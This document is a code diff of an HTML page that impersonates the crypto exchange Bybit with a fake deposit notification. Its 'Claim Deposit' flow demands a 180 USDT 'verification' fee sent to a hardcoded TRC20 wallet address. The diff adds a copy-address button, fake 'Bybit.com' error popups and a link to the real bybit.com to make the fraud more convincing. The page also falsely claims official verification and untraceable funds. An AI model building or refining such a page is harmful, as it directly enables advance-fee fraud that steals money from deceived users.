@@ -18,6 +18,7 @@
             border-radius: 12px;
             box-shadow: 0 2px 12px rgba(0,0,0,0.08);
             background: #fff;
+            position: relative;
         }
         .bybit-logo {
             width: 100px;
@@ -34,6 +35,28 @@
             width: 80px;
             height: 80px;
             object-fit: contain;
+        }
+        .profile-button-top {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #ff8c00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 2;
+        }
+        .profile-flag {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            object-fit: cover;
         }
         h2 {
             text-align: center;
@@ -54,7 +77,7 @@
             font-weight: bold;
             color: #ff8c00;
         }
-        .claim-button, .home-button, .profile-button {
+        .view-transaction-button, .claim-button {
             display: block;
             width: 100%;
             background: #ff8c00;
@@ -68,21 +91,13 @@
             margin-bottom: 10px;
             transition: background 0.2s;
         }
-        .claim-button:hover:enabled,
-        .home-button:hover:enabled,
-        .profile-button:hover:enabled {
+        .view-transaction-button:hover:enabled,
+        .claim-button:hover:enabled {
             background: #e67600;
         }
         .claim-button:disabled {
             opacity: 0.7;
             cursor: not-allowed;
-        }
-        .error-message {
-            color: #d32f2f;
-            font-size: 15px;
-            text-align: center;
-            margin-top: 14px;
-            min-height: 20px;
         }
         .signature {
             margin-top: 22px;
@@ -136,7 +151,7 @@
             border: none;
             cursor: pointer;
         }
-        .modal-action-btn {
+        .modal-action-btn, .copy-btn {
             background: #ff8c00;
             color: #fff;
             padding: 10px 0;
@@ -147,8 +162,9 @@
             font-weight: bold;
             transition: background .2s;
             margin-top: 4px;
+            cursor: pointer;
         }
-        .modal-action-btn:hover {
+        .modal-action-btn:hover, .copy-btn:hover {
             background: #e67600;
         }
         .modal-address {
@@ -160,12 +176,79 @@
             font-size: 14px;
             color: #222;
             margin-top: 10px;
+            word-break: break-all;
+            position: relative;
+        }
+        .copy-btn {
+            width: auto;
+            display: inline-block;
+            margin-left: 10px;
+            padding: 7px 14px;
+            font-size: 13px;
+            border-radius: 4px;
+            vertical-align: middle;
+        }
+        /* Pop up notification styles */
+        .popup-notification {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            border: 1.5px solid #ff8c00;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+            border-radius: 8px;
+            padding: 18px 36px 18px 18px;
+            z-index: 2000;
+            min-width: 250px;
+            max-width: 350px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            animation: fadeInPop .4s;
+        }
+        @keyframes fadeInPop {
+            from { opacity: 0; transform: translateX(-50%) translateY(-20px);}
+            to { opacity: 1; transform: translateX(-50%) translateY(0);}
+        }
+        .popup-logo {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #ff8c00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .popup-logo img {
+            width: 28px;
+            height: 28px;
+            object-fit: contain;
+        }
+        .popup-message {
+            flex: 1;
+            font-size: 15px;
+            color: #333;
+        }
+        .popup-close {
+            background: none;
+            border: none;
+            font-size: 18px;
+            color: #999;
+            cursor: pointer;
+            margin-left: 8px;
         }
     </style>
 </head>
 <body>
     <main>
         <section class="container" aria-label="Deposit Notification">
+            <!-- Profile button (top right corner) -->
+            <button class="profile-button-top" id="profile-button-top" type="button" aria-label="User Profile">
+                <!-- Australia flag SVG icon (no copyright) -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Flag_of_Australia.svg/32px-Flag_of_Australia.svg.png" alt="Australia Flag" class="profile-flag">
+            </button>
             <div class="bybit-logo">
                 <!-- Bybit logo - replace src with actual logo if available -->
                 <img src="IMG_3457.png" alt="Bybit Logo">
@@ -186,10 +269,8 @@
                     Your funds are <strong>safe</strong>, <strong>verified</strong> as a legal source of income, and <strong>not traceable</strong> by third parties.
                 </p>
             </div>
-            <button class="home-button" id="home-button" type="button">Add to Home Screen</button>
+            <button class="view-transaction-button" id="view-transaction-button" type="button">View Transaction</button>
             <button class="claim-button" id="claim-button" type="button">Claim Deposit</button>
-            <button class="profile-button" id="profile-button" type="button">User Profile</button>
-            <div class="error-message" id="error-message" role="alert"></div>
             <div class="signature">
                 <strong>Signature:</strong> Payment officially verified and sent by <strong>bybit.com</strong><br>
                 <span style="font-size:12px;color:#999;">Timestamp: <span id="timestamp"></span></span>
@@ -203,6 +284,14 @@
                     <!-- Modal content will be injected here -->
                 </div>
             </div>
+        </div>
+        <!-- Pop up notification -->
+        <div id="popup-notification" style="display:none;">
+            <div class="popup-logo">
+                <img src="IMG_3457.png" alt="Bybit Logo" />
+            </div>
+            <div class="popup-message" id="popup-message"></div>
+            <button class="popup-close" id="popup-close" aria-label="Close">&times;</button>
         </div>
     </main>
     <script>
@@ -228,15 +317,32 @@
             if (event.target === modal) closeModal();
         };
 
+        // Pop up notification logic
+        function showPopup(message) {
+            const popup = document.getElementById('popup-notification');
+            const popupMsg = document.getElementById('popup-message');
+            popupMsg.innerHTML = message;
+            popup.style.display = 'flex';
+            setTimeout(() => {
+                popup.style.display = 'none';
+            }, 4500); // Hide after 4.5s
+        }
+        document.getElementById('popup-close').onclick = function() {
+            document.getElementById('popup-notification').style.display = 'none';
+        };
+
+        // View Transaction button logic
+        document.getElementById('view-transaction-button').addEventListener('click', () => {
+            window.open('https://bybit.com', '_blank');
+        });
+
         // Claim Deposit logic
         const claimButton = document.getElementById('claim-button');
-        const errorMessage = document.getElementById('error-message');
         const depositStatus = document.getElementById('deposit-status');
 
         claimButton.addEventListener('click', () => {
             claimButton.disabled = true;
             claimButton.textContent = 'Processing...';
-            errorMessage.textContent = '';
 
             // Simulate network/process delay
             setTimeout(() => {
@@ -248,7 +354,9 @@
                         <span style="color:#d32f2f;">Your deposit requires verification via a <b>Signed Bybit GEWI</b> for a fee of <b>180 USDT</b> before it can be claimed.</span><br>
                         Please transfer <strong>180 USDT</strong> to the address below using <strong>TRC20 network</strong> to continue:
                     </p>
-                    <div class="modal-address">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</div>
+                    <div class="modal-address" id="modal-address">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa
+                        <button class="copy-btn" id="copy-address-btn">Copy</button>
+                    </div>
                     <button class="modal-action-btn" id="modal-done-btn">Done</button>
                 `);
                 claimButton.disabled = false;
@@ -261,30 +369,34 @@
                     if (doneBtn) {
                         doneBtn.onclick = closeModal;
                     }
+                    const copyBtn = document.getElementById('copy-address-btn');
+                    if (copyBtn) {
+                        copyBtn.onclick = function() {
+                            const address = 'TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa';
+                            navigator.clipboard.writeText(address);
+                            showPopup('<b>Bybit.com:</b> USDT address copied to clipboard!');
+                        };
+                    }
                 }, 50);
+
+                // Popup notification from Bybit.com
+                setTimeout(() => {
+                    showPopup('<b>Bybit.com:</b> Error - Additional verification required for your deposit.');
+                }, 500);
             }, 1400);
         });
 
-        // Add to Home Screen logic
-        const homeButton = document.getElementById('home-button');
-        homeButton.addEventListener('click', () => {
-            // PWA install prompt logic if available, otherwise show message
-            if (window.matchMedia('(display-mode: standalone)').matches) {
-                alert("This app is already on your home screen.");
-            } else {
-                alert("To add this page to your Home Screen:\n\n- On iPhone/iPad: Tap Share, then 'Add to Home Screen'.\n- On Android: Tap ⋮ menu, then 'Add to Home screen'.");
-            }
-        });
-
-        // Profile button logic - show modal with address
-        const profileButton = document.getElementById('profile-button');
-        profileButton.addEventListener('click', () => {
+        // Profile button (top right) logic - show modal with address and copy
+        const profileButtonTop = document.getElementById('profile-button-top');
+        profileButtonTop.addEventListener('click', () => {
             showModal(`
                 <h3>User USDT Address</h3>
                 <p>
                     USDT Address (TRC20 Network):
                 </p>
-                <div class="modal-address">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</div>
+                <div class="modal-address" id="modal-address-profile">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa
+                    <button class="copy-btn" id="copy-profile-address-btn">Copy</button>
+                </div>
                 <button class="modal-action-btn" id="modal-done-btn-profile">Close</button>
             `);
 
@@ -292,6 +404,14 @@
                 const doneBtn = document.getElementById('modal-done-btn-profile');
                 if (doneBtn) {
                     doneBtn.onclick = closeModal;
+                }
+                const copyBtn = document.getElementById('copy-profile-address-btn');
+                if (copyBtn) {
+                    copyBtn.onclick = function() {
+                        const address = 'TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa';
+                        navigator.clipboard.writeText(address);
+                        showPopup('<b>Bybit.com:</b> USDT address copied to clipboard!');
+                    };
                 }
             }, 50);
         });
